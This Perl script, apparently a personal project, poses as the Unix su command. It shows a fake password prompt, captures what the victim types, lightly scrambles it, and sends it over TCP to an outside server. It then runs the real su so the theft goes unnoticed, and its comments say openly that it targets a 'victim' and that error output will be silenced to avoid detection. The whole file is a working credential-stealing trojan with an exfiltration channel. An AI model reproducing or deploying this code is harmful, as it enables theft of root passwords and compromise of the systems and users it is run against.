#!/usr/bin/perl -w
# FILE: "/home/jkipp/perl-code/expect/evilsu.pl"
# LAST MODIFICATION: "Mon, 20 May 2013 16:40:03 -0400 (jkipp)"
# (C) 2013 by Jim Kipp, <jkipp@ingdirect.com>
# $Id:$

# note: when code is ready and debugged we will remove all of the 
# die blah blah statements. and replace with quiet exits, we don't want error stuff
# printing to the screen
# also I use an exit at the end of the real_su sub to further sqash any 
# messages to stdio, and since the sub will always be the last thing to run
# maybe better to use a : eval (die) and trap the error and send to use or save
# to a file. 

use Expect;
use IO:Socket;

# grab the user if victim enters one
my $user = $ARGV[0] if $ARGV[0];
my $pw;

#  might fail if it's su -
if ($user && $user !~ /root/) {
	real_su();
}

print "Password: ";
$pw = <STDIN>;
chomp $pw;

# send the captured password to be cyphered 
cypher($pw);

# now that we cypher and sent the pw to us go ahead and run the  real su with the stuff victim gave us
&real_su();

sub real_su 
{
	# may have to use a \r and an \n to pass strings to su and enter at console. try both to see which one works.
	my $su = Expect->spawn('/bin/su',$user) or die "Can't start Program: $!\n";
    # stop the output from going to STDOUT since already seen.
    $su->log_stdout(0);
    # capture pw and die with appropriate string if pw is wrong
	my $error = ($su->expect(10, 'password:'))[1];      
	if ($error) 
	{
		print $su "Sorry.\r"; 
		# hopefully this overides the earlier suspending of STDOUT 
		print STDOUT "Sorry.\r";
		$su->soft_close();
	}
        print $su "$pw\r";
	$su->soft_close();
	exit 0;
}


sub cypher {
	my $pass = shift;
	# unpack the password string into 1 byte chars
	my @chars  = unpack("A1" x length($pass), $pass);
	foreach (@chars) {
		# get the ASCII nuneric value for each char,THEN bit shift 2 left, * 3
		$_ = (ord($_) >>2 ) * 3;
	}
   # pack back into a string of unsigned chars
   my $string = pack("C*",@chars);
   tunnel($string); # call tunnel from here.
}


# sends the pw to us, this will act as the client our server will be listening for it.
sub tunnel
{
my $su_pw = shift;
my $server = 'jerry.neptuna.org';
my $socket = IO::Socket::INET->new(PeerAddr => $server,
				   PeerPort => 8500,
				   Proto    => 'tcp',
				   Type     => SOCK_STREAM )
								
	or die "Couldn't connect:  $@\n";

print $socket "$su_pw\n";
$socket->flush();
close($socket);
}
